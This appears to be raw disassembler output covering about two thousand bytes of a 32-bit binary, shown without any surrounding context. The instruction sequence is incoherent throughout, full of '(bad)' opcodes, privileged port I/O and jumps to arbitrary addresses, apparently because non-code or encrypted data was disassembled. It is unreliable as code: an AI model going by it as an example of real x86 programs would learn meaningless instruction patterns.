  418faa:	and    ebx,ecx
  418fac:	pop    ds
  418fad:	push   ebp
  418fae:	and    dl,dh
  418fb0:	adc    ebx,ecx
  418fb2:	imul   dh
  418fb4:	sbb    BYTE PTR [eax],bh
  418fb6:	jmp    0x418f5e
  418fb8:	fsub   DWORD PTR [ebx+0x25403aa9]
  418fbe:	push   ds
  418fbf:	sbb    dl,al
  418fc1:	push   0xffffffd8
  418fc3:	sub    al,0x44
  418fc5:	fdivr  DWORD PTR [edx+0x5b]
  418fc8:	adc    BYTE PTR [ecx],ah
  418fca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fcb:	inc    esi
  418fcc:	bound  edi,QWORD PTR [edx+0x4a]
  418fcf:	stos   DWORD PTR es:[edi],eax
  418fd0:	cmp    eax,0x7b1ff2f9
  418fd5:	mov    esi,0xf72a07
  418fda:	sar    esi,cl
  418fdc:	fucomp st(5)
  418fde:	inc    edi
  418fdf:	or     DWORD PTR [ecx-0x18],esi
  418fe2:	jbe    0x418f83
  418fe4:	sub    al,0x35
  418fe6:	or     esi,DWORD PTR [esi+eax*1-0x1f6da5d]
  418fed:	pop    esi
  418fee:	jae    0x418f85
  418ff0:	and    esp,DWORD PTR [ecx]
  418ff2:	(bad)  
  418ff3:	popa   
  418ff4:	add    al,0x4d
  418ff6:	adc    bh,BYTE PTR [esi+ebx*2]
  418ff9:	and    ecx,DWORD PTR [esi]
  418ffb:	rcr    BYTE PTR [edx+eax*4+0x11],cl
  418fff:	mov    dl,BYTE PTR [ebp+0x236f0496]
  419005:	dec    eax
  419006:	es mov ebp,0x5d47cc30
  41900c:	cwde   
  41900d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41900e:	sbb    eax,0x3b5bbc8d
  419013:	lods   al,BYTE PTR ds:[esi]
  419014:	xor    al,0x94
  419016:	not    BYTE PTR [edx]
  419018:	inc    edx
  419019:	xchg   DWORD PTR [esi],eax
  41901b:	push   ebx
  41901c:	daa    
  41901d:	stc    
  41901e:	and    DWORD PTR [edi-0x36],eax
  419021:	scas   eax,DWORD PTR es:[edi]
  419022:	xor    eax,0xe52568e9
  419027:	cmp    edi,DWORD PTR [edx]
  419029:	xor    al,0xeb
  41902b:	retf   
  41902c:	xchg   ebp,eax
  41902d:	xor    ah,dl
  41902f:	fdiv   st,st(6)
  419031:	nop
  419032:	cli    
  419033:	cwde   
  419034:	loope  0x418ffa
  419036:	mov    ds:0xa67e5c4f,al
  41903b:	cmp    ah,ah
  41903d:	inc    edx
  41903e:	shr    BYTE PTR [edi+0x45a3483b],1
  419044:	not    BYTE PTR [ebp+0x5a]
  419047:	shl    BYTE PTR [ecx-0x6df3e34],1
  41904d:	lods   al,BYTE PTR ds:[esi]
  41904e:	xor    BYTE PTR [edi-0x7e91e1d8],0xf7
  419055:	xlat   BYTE PTR ds:[ebx]
  419056:	sub    al,0xb
  419058:	in     eax,0xeb
  41905a:	pop    edi
  41905b:	push   ss
  41905c:	lds    edi,FWORD PTR ds:0x9b96ce68
  419062:	jle    0x4190ad
  419064:	jl     0x4190b1
  419066:	in     eax,dx
  419067:	(bad)
  41906a:	xor    ebp,ebx
  41906c:	popf   
  41906d:	xor    ch,BYTE PTR [ebx+0x31]
  419070:	test   eax,0xf609b829
  419075:	sub    ah,BYTE PTR [esi+0x79]
  419078:	add    ecx,0x6b
  41907b:	jns    0x419091
  41907d:	jae    0x41905c
  41907f:	loope  0x4190a0
  419081:	jno    0x41908a
  419083:	add    edx,DWORD PTR [ebp+ecx*4-0x338bb6ef]
  41908a:	dec    ebp
  41908b:	xchg   esi,eax
  41908c:	mov    BYTE PTR [ebx-0x23],ah
  41908f:	into   
  419090:	xor    eax,0x40063c92
  419095:	fdiv   st,st(3)
  419097:	mov    eax,0x3251b934
  41909c:	jp     0x419119
  41909e:	lahf   
  41909f:	adc    BYTE PTR [ebx-0x2d],al
  4190a2:	dec    ebp
  4190a3:	dec    eax
  4190a4:	std    
  4190a5:	cmc    
  4190a6:	jge    0x419058
  4190a8:	mov    edx,0xc26aed85
  4190ad:	inc    edi
  4190ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190af:	mov    ebx,0x47a462e8
  4190b4:	cwde   
  4190b5:	mov    DWORD PTR [edx-0x37de464a],esi
  4190bb:	test   BYTE PTR [edi],al
  4190bd:	sbb    al,0x56
  4190bf:	sub    DWORD PTR [ecx-0x2a],edi
  4190c2:	fimul  WORD PTR [edi-0x7d]
  4190c5:	xor    bl,BYTE PTR [edx]
  4190c7:	ficom  WORD PTR [ebx+eax*4+0x2a]
  4190cb:	cmp    ebx,edi
  4190cd:	push   cs
  4190ce:	sub    ch,BYTE PTR [ebp-0x60]
  4190d1:	add    edi,DWORD PTR [ebx-0x59cd0b34]
  4190d7:	ds push edx
  4190d9:	or     esp,DWORD PTR [ebp-0x4c]
  4190dc:	push   edi
  4190dd:	jno    0x4190a2
  4190df:	cli    
  4190e0:	out    0xfd,al
  4190e2:	xchg   edi,eax
  4190e3:	sub    eax,0x9f4cd100
  4190e8:	and    al,0xca
  4190ea:	div    DWORD PTR [esi+edi*1-0x39407674]
  4190f1:	mov    ds:0x926c3f7b,eax
  4190f6:	test   BYTE PTR [esi+edx*1],dl
  4190f9:	enter  0x7206,0x7d
  4190fd:	adc    DWORD PTR [ecx],0xd8684c3d
  419103:	jae    0x419126
  419105:	jo     0x4190c0
  419107:	add    BYTE PTR [esi-0x286c00f4],bh
  41910d:	mov    dh,0x4
  41910f:	data16 jp 0x419173
  419112:	rcr    ah,1
  419114:	js     0x4190ec
  419116:	xchg   DWORD PTR [edx],ebx
  419118:	outs   dx,BYTE PTR ds:[esi]
  419119:	mov    WORD PTR [edx+0x10161b20],?
  41911f:	ins    DWORD PTR es:[edi],dx
  419120:	mov    edx,0xa9d39d3f
  419125:	xchg   ecx,eax
  419126:	aaa    
  419127:	fmul   QWORD PTR [edi+ecx*4]
  41912a:	test   BYTE PTR [edi-0x2cc2a6e7],cl
  419130:	inc    edi
  419131:	jge    0x4190dd
  419133:	jo     0x4190fc
  419135:	(bad)  
  419136:	comiss xmm6,DWORD PTR [edi]
  419139:	outs   dx,BYTE PTR ds:[esi]
  41913a:	mov    eax,0x5bd0ffb9
  41913f:	and    al,0xe
  419141:	aaa    
  419142:	pop    es
  419143:	mov    BYTE PTR es:[ecx+edi*2],cl
  419147:	sbb    bl,0x70
  41914a:	dec    DWORD PTR ds:0x53dd9e75
  419150:	or     DWORD PTR [esi+0x29d308c3],ebp
  419156:	into   
  419157:	mov    ebx,0x5b125fcf
  41915c:	hlt    
  41915d:	sub    al,0x83
  41915f:	mov    bh,0x87
  419161:	fcomp  DWORD PTR [esp+edx*8]
  419164:	push   ebx
  419165:	jg     0x4191d0
  419167:	add    BYTE PTR [esi-0x267675e1],ch
  41916d:	(bad)  
  41916e:	mov    esp,0x30d37d02
  419173:	jns    0x419158
  419175:	cmc    
  419176:	pop    esp
  419177:	push   esi
  419178:	push   esp
  419179:	in     eax,0x65
  41917b:	in     eax,dx
  41917c:	mov    ds:0xff956071,eax
  419181:	clc    
  419182:	aam    0xc0
  419184:	(bad)  
  419185:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  419187:	adc    eax,0x77c9a7ca
  41918c:	in     eax,0xa1
  41918e:	out    0x66,al
  419190:	or     esp,DWORD PTR [eax]
  419192:	test   BYTE PTR [esi-0x7c196477],dl
  419198:	je     0x4191f0
  41919a:	fs push ebp
  41919c:	jle    0x419142
  41919e:	aas    
  41919f:	sbb    eax,eax
  4191a1:	pop    esi
  4191a2:	ret    
  4191a3:	lds    eax,FWORD PTR [ebx+ebp*4-0x6b]
  4191a7:	push   edx
  4191a8:	lock pushf 
  4191aa:	outs   dx,BYTE PTR ds:[esi]
  4191ab:	xchg   edx,eax
  4191ac:	loop   0x419143
  4191ae:	dec    esi
  4191af:	xor    dl,BYTE PTR [edx]
  4191b1:	sti    
  4191b2:	sahf   
  4191b3:	popa   
  4191b4:	xor    DWORD PTR [edx+0x4263cd57],0x5ef3f204
  4191be:	sub    BYTE PTR [eax],ah
  4191c0:	mov    ch,0xe1
  4191c2:	hlt    
  4191c3:	out    dx,al
  4191c4:	xor    bl,BYTE PTR [ecx+eax*8]
  4191c7:	rol    DWORD PTR [esp+eiz*8-0x58],0x0
  4191cc:	pushf  
  4191cd:	xor    DWORD PTR [ebx+0x2d],ecx
  4191d0:	xor    BYTE PTR [ebp+0x41],bh
  4191d3:	(bad)  
  4191d5:	(bad)  
  4191d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191d7:	mov    ch,0x97
  4191d9:	jnp    0x41922e
  4191db:	inc    eax
  4191dc:	jle    0x419184
  4191de:	sbb    esi,edi
  4191e0:	dec    esp
  4191e1:	stos   BYTE PTR es:[edi],al
  4191e2:	ret    0xcf6a
  4191e5:	or     al,0xd8
  4191e7:	js     0x4191d0
  4191e9:	dec    ecx
  4191ea:	and    dh,BYTE PTR [eax+0xa]
  4191ed:	ret    
  4191ee:	mov    ch,0xe8
  4191f0:	pop    eax
  4191f1:	fs hlt 
  4191f3:	mov    edi,0xeb4e8b2a
  4191f8:	enter  0xbcd7,0x5b
  4191fc:	mov    ch,0x9a
  4191fe:	and    BYTE PTR [edx+0x4b],ch
  419201:	outs   dx,DWORD PTR fs:[esi]
  419203:	lods   al,BYTE PTR ds:[esi]
  419204:	cdq    
  419205:	pushf  
  419206:	clc    
  419207:	lds    ebx,FWORD PTR [ebp+0x22]
  41920a:	pop    ss
  41920b:	shr    DWORD PTR [esi],cl
  41920d:	or     BYTE PTR [ecx],dl
  41920f:	add    eax,0xc903468b
  419214:	jae    0x419263
  419216:	mov    cl,0x47
  419218:	pop    es
  419219:	stos   DWORD PTR es:[edi],eax
  41921a:	jb     0x419248
  41921c:	dec    esp
  41921d:	jo     0x4191b6
  41921f:	in     al,dx
  419220:	or     al,BYTE PTR [edi+eax*2]
  419223:	addr16 adc al,0x1f
  419226:	cmp    ah,BYTE PTR [ecx]
  419228:	sub    eax,0x32463ad3
  41922d:	icebp  
  41922e:	fwait
  41922f:	mov    edx,esi
  419231:	adc    BYTE PTR [ebx-0x6b],dh
  419234:	inc    edx
  419235:	xchg   DWORD PTR [edx+0x5a],edi
  419238:	icebp  
  419239:	mov    cl,0xd1
  41923b:	jo     0x419285
  41923d:	nop
  41923e:	or     DWORD PTR [ecx],eax
  419240:	and    al,bl
  419242:	fimul  DWORD PTR [ebx-0x9]
  419245:	(bad)  
  419246:	hlt    
  419247:	arpl   WORD PTR [eax+0x4d],dx
  41924a:	push   esp
  41924b:	cs repz sti 
  41924e:	inc    esp
  41924f:	push   ss
  419250:	jo     0x419244
  419252:	pop    ebp
  419253:	ins    BYTE PTR es:[edi],dx
  419254:	sti    
  419255:	jo     0x4191da
  419257:	mov    BYTE PTR [ecx-0x73a4b6ac],cl
  41925d:	jecxz  0x4191fc
  41925f:	cwde   
  419260:	test   DWORD PTR [ecx],0x2b901e16
  419266:	test   eax,0x4a660f40
  41926b:	push   ecx
  41926c:	mov    ebp,0x9ccabeed
  419271:	popa   
  419272:	jle    0x419215
  419274:	inc    ebx
  419275:	mov    al,ds:0x81611be1
  41927a:	dec    edx
  41927b:	add    ebx,DWORD PTR [esi+0x4aaa24cb]
  419281:	mov    BYTE PTR [ebp+0x3677a52d],0x39
  419288:	jbe    0x419263
  41928a:	fsubr  QWORD PTR [eax+0x3dfa8f44]
  419290:	jmp    0x4951:0x88aa3862
  419297:	nop
  419298:	add    edx,edi
  41929a:	ins    DWORD PTR es:[edi],dx
  41929b:	push   ds
  41929c:	call   DWORD PTR [edi+0x751ee18c]
  4192a2:	clc    
  4192a3:	enter  0xd7e8,0xbd
  4192a7:	xor    DWORD PTR [esi-0x28],edi
  4192aa:	test   eax,0x4dd7fa13
  4192af:	xchg   esi,eax
  4192b0:	and    bl,al
  4192b2:	shl    DWORD PTR [edi+0x11],1
  4192b5:	cwde   
  4192b6:	or     DWORD PTR [ebp+0x21],esi
  4192b9:	mov    ah,0x8
  4192bb:	aad    0x18
  4192bd:	dec    esi
  4192be:	enter  0xbc59,0x82
  4192c2:	pop    ebx
  4192c3:	hlt    
  4192c4:	pop    ebx
  4192c5:	xchg   ebp,eax
  4192c6:	mov    ds:0xb824894e,eax
  4192cb:	adc    eax,0x2c6aedf1
  4192d0:	xchg   ebx,eax
  4192d1:	lock rcl BYTE PTR ds:0x842c6672,1
  4192d8:	addr16 cmp al,0xbf
  4192db:	int3   
  4192dc:	cmp    dl,al
  4192de:	into   
  4192df:	test   BYTE PTR [edx+0x4f],ah
  4192e2:	jae    0x419319
  4192e4:	xlat   BYTE PTR ds:[ebx]
  4192e5:	pop    es
  4192e6:	lods   al,BYTE PTR ds:[esi]
  4192e7:	fidivr WORD PTR [edx+0x3e]
  4192ea:	mov    ecx,0xc28ffba7
  4192ef:	mov    dl,0x98
  4192f1:	scas   eax,DWORD PTR es:[edi]
  4192f2:	cmc    
  4192f3:	loope  0x419288
  4192f5:	cdq    
  4192f6:	mov    ebx,0x3e55aa24
  4192fb:	sub    eax,0xe9a981cf
  419300:	push   ebx
  419301:	jno    0x419327
  419303:	pop    edi
  419304:	pop    eax
  419305:	jg     0x4192ce
  419307:	leave  
  419308:	icebp  
  419309:	cmp    DWORD PTR [esi+0x8],0xffffffb5
  41930d:	mov    esi,0x5afee64a
  419312:	mov    ebx,0x24dad0b0
  419317:	or     bh,bh
  419319:	xlat   BYTE PTR ds:[ebx]
  41931a:	int3   
  41931b:	in     al,0x75
  41931d:	call   0x78f9:0x23856a35
  419324:	dec    esp
  419325:	mov    dl,0x28
  419327:	mov    dl,0xd0
  419329:	data16 aas 
  41932b:	test   bl,bl
  41932d:	xor    BYTE PTR [edi],dh
  41932f:	dec    edi
  419330:	dec    esi
  419331:	(bad)  
  419332:	mov    ecx,0x6178ae6a
  419337:	ret    
  419338:	(bad)  
  41933a:	jmp    0x41931a
  41933c:	mov    ds:0xf340e341,al
  419341:	(bad)  
  419342:	push   ebp
  419343:	scas   al,BYTE PTR es:[edi]
  419344:	cmp    esp,ebp
  419346:	or     dl,BYTE PTR ds:0x9c96821a
  41934c:	(bad)  
  41934d:	mov    edi,0x79011aa6
  419352:	xchg   edx,eax
  419353:	retf   0x1e95
  419356:	pop    esp
  419357:	jno    0x41933f
  419359:	lods   al,BYTE PTR ds:[esi]
  41935a:	pop    ds
  41935b:	adc    eax,0x5b120c7c
  419360:	dec    esi
  419361:	rcl    DWORD PTR [eax+0x5d91f6a1],1
  419367:	stos   BYTE PTR es:[edi],al
  419368:	pop    edx
  419369:	sub    eax,eax
  41936b:	push   ds
  41936c:	xor    bl,BYTE PTR [eax+0x13681e6e]
  419372:	imul   ecx,edx,0x42
  419375:	repnz xchg esi,eax
  419377:	mov    ?,edi
  419379:	or     al,BYTE PTR [ecx+ebp*2+0x372a2c66]
  419380:	mov    bh,0xa7
  419382:	in     eax,0xfe
  419384:	(bad)  
  419385:	in     eax,0x10
  419387:	sbb    BYTE PTR [ebx+0x5c996242],ch
  41938d:	shl    ch,0x29
  419390:	icebp  
  419391:	ins    DWORD PTR es:[edi],dx
  419392:	xchg   bh,dh
  419394:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419395:	sbb    ch,BYTE PTR [ebx+0x7260efcf]
  41939b:	test   edi,0xf0e2e60f
  4193a1:	push   cs
  4193a2:	lock mov ecx,0x88082d03
  4193a8:	cmp    ebx,DWORD PTR [edx+0x1570378]
  4193ae:	dec    ebx
  4193af:	mov    edx,0xa28cdcdf
  4193b4:	mov    ds:0x762120e,al
  4193b9:	xchg   ebx,eax
  4193ba:	mov    edi,0xd5ef4695
  4193bf:	arpl   si,di
  4193c1:	or     eax,0x7dc1b52
  4193c6:	push   ebp
  4193c7:	mov    edx,0xb46db43
  4193cc:	(bad)
  4193d0:	sbb    al,BYTE PTR [ecx]
  4193d2:	mov    al,0x4b
  4193d4:	dec    esp
  4193d5:	push   edx
  4193d6:	sar    DWORD PTR [ecx+0x60396e14],0x4f
  4193dd:	bound  ecx,QWORD PTR [ebx]
  4193df:	jne    0x419366
  4193e1:	mov    eax,0x65d4b676
  4193e6:	std    
  4193e7:	scas   eax,DWORD PTR es:[edi]
  4193e8:	repnz stos BYTE PTR es:[edi],al
  4193ea:	je     0x4193fa
  4193ec:	cmp    ecx,DWORD PTR [edi-0x55]
  4193ef:	outs   dx,BYTE PTR ds:[esi]
  4193f0:	fimul  DWORD PTR [ebp+0x39]
  4193f4:	aas    
  4193f5:	lods   al,BYTE PTR ds:[esi]
  4193f6:	cmp    bl,BYTE PTR [edx-0x7a018c93]
  4193fc:	and    esp,DWORD PTR [edx-0x3f]
  4193ff:	mov    ds:0xb0c7cd59,al
  419404:	or     BYTE PTR [edi+0x44003c75],ch
  41940a:	dec    edi
  41940b:	mov    eax,ds:0xad7dd2cb
  419410:	dec    edi
  419411:	in     eax,dx
  419412:	popa   
  419413:	pop    ebp
  419414:	xor    BYTE PTR [ebx+ebx*8+0x313f9c4d],dl
  41941b:	shl    DWORD PTR [eax+0x34],1
  41941e:	xlat   BYTE PTR ds:[ebx]
  41941f:	or     al,0xb1
  419421:	int3   
  419422:	fld    DWORD PTR [edx+0x9]
  419425:	xchg   BYTE PTR [ebx+0x1342be15],al
  41942b:	sub    eax,0xb5bd43f6
  419430:	stos   DWORD PTR es:[edi],eax
  419431:	pop    eax
  419432:	dec    esp
  419433:	sub    BYTE PTR ds:0x8207547b,bh
  419439:	je     0x419433
  41943b:	jmp    0x41945d
  41943d:	cdq    
  41943e:	ins    BYTE PTR es:[edi],dx
  41943f:	pusha  
  419440:	pop    esi
  419441:	mov    ebp,0x61ca565f
  419446:	pop    edx
  419447:	aam    0xd1
  419449:	in     al,0x85
  41944b:	sub    DWORD PTR [ecx-0x5b],ebp
  41944e:	cwde   
  41944f:	jmp    0x5ca5e37c
  419454:	cmp    BYTE PTR [ebx+0x456cf8d3],dh
  41945a:	(bad)  
  41945b:	mov    al,ds:0x67c9551c
  419460:	lahf   
  419461:	or     dl,BYTE PTR [ecx]
  419463:	sbb    dl,cl
  419465:	dec    ebp
  419466:	loop   0x419493
  419468:	iretw  
  41946a:	js     0x419448
  41946c:	sbb    esi,eax
  41946e:	into   
  41946f:	mov    al,ds:0x5f32f3ad
  419474:	fs push es
  419476:	sub    DWORD PTR [edi-0x3ffe989d],ebp
  41947c:	and    BYTE PTR [esi+0x6d],ch
  41947f:	mov    DWORD PTR [ebp+0x7b],esi
  419482:	ins    DWORD PTR es:[edi],dx
  419483:	or     cl,BYTE PTR [eax+0x39]
  419486:	icebp  
  419487:	lock lea edx,ds:0x197bf1d4
  41948e:	mov    ds:0xb9c7f587,eax
  419493:	test   ebx,0xc2b8e179
  419499:	call   0xc8df3faf
  41949e:	fsub   QWORD PTR [eax]
  4194a0:	cli    
  4194a1:	pop    es
  4194a2:	out    0x2b,eax
  4194a4:	mov    eax,0x38e857a1
  4194a9:	fistp  DWORD PTR [esi-0x11]
  4194ac:	sub    DWORD PTR [esi-0x742a87e8],0xffffff9a
  4194b3:	stos   DWORD PTR es:[edi],eax
  4194b4:	out    dx,al
  4194b5:	sbb    ah,BYTE PTR [edi-0x37]
  4194b8:	sbb    BYTE PTR [edx+0x6935b62f],0xdd
  4194bf:	loopne 0x4194c4
  4194c1:	out    dx,eax
  4194c2:	stos   DWORD PTR es:[edi],eax
  4194c3:	mov    es,WORD PTR [edx]
  4194c5:	and    eax,0x50eba03
  4194ca:	xchg   ebx,eax
  4194cb:	fs ja  0x41950f
  4194ce:	inc    edx
  4194cf:	sti    
  4194d0:	lahf   
  4194d1:	adc    BYTE PTR [esi],dh
  4194d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194d5:	rcr    DWORD PTR [ebp+0x1907b30],0x16
  4194dc:	sbb    esi,eax
  4194de:	fst    QWORD PTR [ebx-0x6d1bbd89]
  4194e4:	(bad)  
  4194e5:	xchg   ebx,eax
  4194e6:	jge    0x4194cc
  4194e8:	cwde   
  4194e9:	dec    edx
  4194ea:	push   0xffffffb5
  4194ec:	push   esp
  4194ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194ee:	mov    BYTE PTR [esi],bh
  4194f0:	or     eax,0xb20175b3
  4194f5:	sub    esp,DWORD PTR [edi+0x70543df0]
  4194fb:	add    al,0x2b
  4194fd:	dec    eax
  4194fe:	push   esi
  4194ff:	retf   
  419500:	or     DWORD PTR [ecx-0x32aedb25],edi
  419506:	sahf   
  419507:	mov    ebx,esp
  419509:	push   0xffffffe8
  41950b:	mov    cl,0x9
  41950d:	sub    al,0xde
  41950f:	and    dh,BYTE PTR [edi+0x5860b83]
  419515:	and    edx,DWORD PTR [ebx-0x38]
  419518:	push   es
  419519:	jg     0x419545
  41951b:	popf   
  41951c:	into   
  41951d:	mov    ch,0x3
  41951f:	scas   eax,DWORD PTR es:[edi]
  419520:	cmp    esp,ecx
  419522:	loop   0x4194c4
  419524:	stos   DWORD PTR es:[edi],eax
  419525:	dec    edi
  419526:	cmp    DWORD PTR [edi-0x30744e3c],edx
  41952c:	or     edx,ecx
  41952e:	sbb    al,0xba
  419530:	add    DWORD PTR [edi+0x51532213],esi
  419536:	loopne 0x4194b8
  419538:	and    edi,DWORD PTR [ecx+0x4c]
  41953b:	adc    edi,DWORD PTR [ecx+edx*2]
  41953e:	pop    es
  41953f:	mov    esp,0x1f27504f
  419544:	sar    DWORD PTR [edx],0xb7
  419547:	test   DWORD PTR [edi],ecx
  419549:	in     eax,0xea
  41954b:	or     BYTE PTR [ecx-0x23],bh
  41954e:	popf   
  41954f:	aaa    
  419550:	mov    bh,0xfb
  419552:	cmc    
  419553:	sub    eax,0xa0cd2299
  419558:	xchg   ecx,eax
  419559:	pop    edx
  41955a:	xor    al,0x61
  41955c:	stos   BYTE PTR es:[edi],al
  41955d:	mov    ebp,DWORD PTR [edi-0x47530b49]
  419563:	and    ecx,DWORD PTR [edx+0x76]
  419566:	lods   eax,DWORD PTR ds:[esi]
  419567:	inc    esp
  419568:	xor    bl,BYTE PTR [edx+0xe]
  41956b:	jb     0x41959e
  41956d:	xor    al,0x83
  41956f:	inc    edx
  419570:	retf   0x57a4
  419573:	fidiv  DWORD PTR [edx-0x6c]
  419576:	div    DWORD PTR [edi+0x71]
  419579:	cld    
  41957a:	jne    0x41955f
  41957c:	enter  0xd7e0,0xa4
  419580:	cwde   
  419581:	fisub  WORD PTR [ebp-0x6c64f7ad]
  419587:	lock pop es
  419589:	pop    esp
  41958a:	sbb    al,BYTE PTR [eax-0x75]
  41958d:	mov    edx,0xa62fa6a1
  419592:	mov    ss,WORD PTR [esi+0x25e8790c]
  419598:	jb     0x4195b2
  41959a:	pushf  
  41959b:	test   eax,0xa7eedf91
  4195a0:	adc    esi,esp
  4195a2:	xchg   ecx,eax
  4195a3:	push   ss
  4195a4:	mov    al,ds:0x8e09c864
  4195a9:	test   BYTE PTR [ebx+0xcb1d6f],dh
  4195af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195b0:	pop    ebp
  4195b1:	jle    0x419595
  4195b3:	inc    ebx
  4195b4:	and    eax,edi
  4195b6:	ins    DWORD PTR es:[edi],dx
  4195b7:	fst    QWORD PTR [ebp+0x27]
  4195ba:	sub    eax,0x3a930818
  4195bf:	fwait
  4195c0:	cli    
  4195c1:	and    bl,BYTE PTR [edi+eiz*8-0x668f49f9]
  4195c8:	xchg   DWORD PTR [ebp-0x69d7de3c],edi
  4195ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195cf:	pop    ss
  4195d0:	xor    eax,0x21afab89
  4195d5:	and    al,0x82
  4195d7:	pop    esi
  4195d8:	mov    ds:0x268401d5,al
  4195dd:	mov    eax,ds:0x3ba4c95b
  4195e2:	mov    al,ds:0x7bba6742
  4195e7:	mov    ds:0x2e322d54,al
  4195ec:	ins    BYTE PTR es:[edi],dx
  4195ed:	inc    ebx
  4195ee:	retf   0x351b
  4195f1:	sbb    bh,BYTE PTR [edi-0x1f]
  4195f4:	push   esp
  4195f5:	lahf   
  4195f6:	or     eax,eax
  4195f8:	cdq    
  4195f9:	repz call 0xefc3:0x5cae8e10
  419601:	mov    bh,0xf5
  419603:	mov    ds:0xd0cfc809,al
  419608:	test   esp,0x86fb8a0d
  41960e:	cs push ss
  419610:	popf   
  419611:	or     al,0x35
  419613:	push   eax
  419614:	xchg   ecx,eax
  419615:	add    DWORD PTR [ecx-0x71],ebp
  419618:	pop    ds
  419619:	outs   dx,BYTE PTR ds:[esi]
  41961a:	push   edi
  41961b:	loope  0x4195d3
  41961d:	fs push cs
  41961f:	aas    
  419620:	aas    
  419621:	scas   al,BYTE PTR es:[edi]
  419622:	cmp    BYTE PTR [ebp+0x36],dl
  419625:	push   ds
  419626:	mov    BYTE PTR [eax+0x3f],bl
  419629:	or     BYTE PTR [edi],0x89
  41962c:	dec    ebp
  41962d:	pop    ecx
  41962e:	adc    BYTE PTR [edx+0x626dd946],0x76
  419635:	retf   
  419636:	sub    al,0xa1
  419638:	pop    esi
  419639:	outs   dx,DWORD PTR ds:[esi]
  41963a:	pop    ss
  41963b:	mov    edx,0xa4c015c1
  419640:	mov    DWORD PTR [edx+0x65],ebx
  419643:	inc    ebx
  419644:	dec    edi
  419645:	stos   DWORD PTR es:[edi],eax
  419646:	add    BYTE PTR [esi-0xc1da4cc],bh
  41964c:	jmp    0x419690
  41964e:	add    DWORD PTR [eax],ecx
  419650:	sbb    BYTE PTR [eax-0x75d5fece],0x3e
  419657:	test   eax,0x56cb9112
  41965c:	div    BYTE PTR [eax+0x64]
  41965f:	jae    0x4196db
  419661:	mov    ebp,0xa694baba
  419666:	ret    
  419667:	js     0x4195fc
  419669:	add    al,0x27
  41966b:	in     al,dx
  41966c:	push   edx
  41966d:	xchg   ebp,eax
  41966e:	mov    cl,0x30
  419670:	jnp    0x41964f
  419672:	mov    edx,0xd2eb8df1
  419677:	hlt    
  419678:	mov    esp,0xa3fc0410
  41967d:	es mov ecx,0xe04c3ff2
  419683:	outs   dx,DWORD PTR ds:[esi]
  419684:	inc    ecx
  419685:	loopne 0x419652
  419687:	cmp    bl,BYTE PTR [esi+0x6b]
  41968a:	aas    
  41968b:	jae    0x4196a3
  41968d:	xchg   ebp,eax
  41968e:	int    0x4f
  419690:	dec    esp
  419691:	stos   BYTE PTR es:[edi],al
  419692:	jl     0x4196d9
  419694:	call   0x8ac9:0x57bae683
  41969b:	cld    
  41969c:	out    0xe3,eax
  41969e:	push   ss
  41969f:	mov    ds:0xeae69d84,al
  4196a4:	test   DWORD PTR [ebp+0x78],ebp
  4196a7:	in     al,0xcf
  4196a9:	add    ah,BYTE PTR [esi+0x2ca73ee]
  4196af:	mov    esp,DWORD PTR [ecx+0x64]
  4196b2:	mov    edi,0x28fc64ed
  4196b7:	push   ds
  4196b8:	fadd   st,st(5)
  4196ba:	jnp    0x41966d
  4196bc:	sti    
  4196bd:	test   bl,0xa3
  4196c0:	dec    eax
  4196c1:	or     eax,0xce5438af
  4196c6:	lds    esp,FWORD PTR [ecx+esi*4-0x58]
  4196ca:	sbb    al,0xcf
  4196cc:	push   edx
  4196cd:	call   0xa426fd3f
  4196d2:	test   eax,0xcc8016e3
  4196d7:	imul   eax,DWORD PTR [eax-0x9],0x8791b6a0
  4196de:	int3   
  4196df:	cwde   
  4196e0:	pop    edx
  4196e1:	repnz and eax,0x4cd6759c
  4196e7:	pop    edx
  4196e8:	xor    ah,BYTE PTR [ebx+0x65a52659]
  4196ee:	or     al,0xf1
  4196f0:	lds    esi,FWORD PTR [edi-0x70]
  4196f3:	cmp    BYTE PTR [eax-0x7e],ah
  4196f6:	outs   dx,DWORD PTR ds:[esi]
  4196f7:	ror    ch,1
  4196f9:	pop    esp
  4196fa:	adc    BYTE PTR [edi+edi*8+0x5462b413],0xa7
  419702:	fwait
  419703:	sbb    BYTE PTR [edi-0x72217939],ah
  419709:	ss fwait
  41970b:	inc    eax
  41970c:	je     0x419694
  41970e:	inc    ebx
  41970f:	out    0x78,eax
  419711:	mov    al,cl
  419713:	fs stos BYTE PTR es:[edi],al
  419715:	popf   
  419716:	mov    ebx,0x95de0187
  41971b:	jmp    FWORD PTR [esi-0x3b]
  41971e:	dec    ecx
  41971f:	imul   eax,DWORD PTR [ecx+0x386244bd],0xfffffff5
  419726:	jp     0x4196b1
  419728:	data16 cld 
  41972a:	xchg   edi,eax
  41972b:	mov    dl,0x59
  41972d:	cmp    DWORD PTR [ebp-0x4c9c6f6e],eax
  419733:	scas   eax,DWORD PTR es:[edi]
  419734:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419735:	cdq    
  419736:	push   0xbd2d47b4
  41973b:	xchg   DWORD PTR [ecx+0x5d5fe651],esi
  419741:	pop    ebp
  419742:	push   esi
  419743:	sbb    al,0x49
  419745:	dec    ebx
  419746:	ror    BYTE PTR [edx],0x31
  419749:	jno    0x41979d
  41974b:	sahf   
  41974c:	inc    ebp
  41974d:	xchg   ecx,eax
  41974e:	repnz sbb ch,BYTE PTR cs:[ebp+0x47]
  419753:	adc    eax,0x71ac8cc1
  419758:	or     eax,0x2973bd24
  41975d:	or     edi,edi
  41975f:	push   cs
  419760:	cmp    dl,cl
  419762:	shl    esi,0xc0
  419765:	pop    edx
  419766:	sbb    cl,dl
  419768:	or     ah,BYTE PTR [ebp+0x6937cb0c]
  41976e:	shr    DWORD PTR [eax],1
  419770:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419771:	(bad)  
  419772:	in     al,dx
